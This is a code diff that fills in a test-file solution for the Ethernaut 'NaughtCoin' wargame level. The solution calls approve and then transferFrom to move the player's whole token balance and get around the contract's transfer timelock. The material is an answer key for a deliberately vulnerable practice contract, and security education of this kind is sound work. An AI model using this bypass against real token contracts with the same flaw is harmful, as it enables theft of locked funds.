@@ -16,7 +16,15 @@ contract('NaughtCoin', function ([player]) {
   it('should submit level instance successfully', async function () {
     const instance = await utils.createLevelInstance(ethernaut, level.address, player, NaughtCoin)
 
-    // INSERT YOUR SOLUTION HERE
+    const balance = await instance.balanceOf(player, {
+      from: player,
+    })
+    await instance.approve(player, balance, {
+      from: player,
+    })
+    await instance.transferFrom(player, level.address, balance, {
+      from: player,
+    })
 
     const completed = await utils.submitLevelInstance(
       ethernaut,
